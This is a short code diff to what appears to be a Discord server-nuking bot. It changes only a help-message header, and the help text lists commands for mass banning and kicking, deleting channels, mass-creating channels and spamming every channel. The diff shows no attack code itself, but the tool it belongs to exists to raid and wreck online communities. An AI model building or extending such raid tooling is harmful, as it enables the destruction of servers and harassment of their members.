@@ -156,7 +156,7 @@ async def worker_pool(items, handler, concurrency: int, phase_timeout: float, pe
 async def help_cmd(ctx):
     await safe_send(
         ctx,
-        "MEGA NUKE COMMANDS\n"
+        "NUKE COMMANDS\n"
         "!help\n!ban / !kick\n!delch\n"
         "!hypercreate [name] [amount] / !hc\n"
         "!spam [msg] [count]\n!spamall [msg] [por_channel]\n"
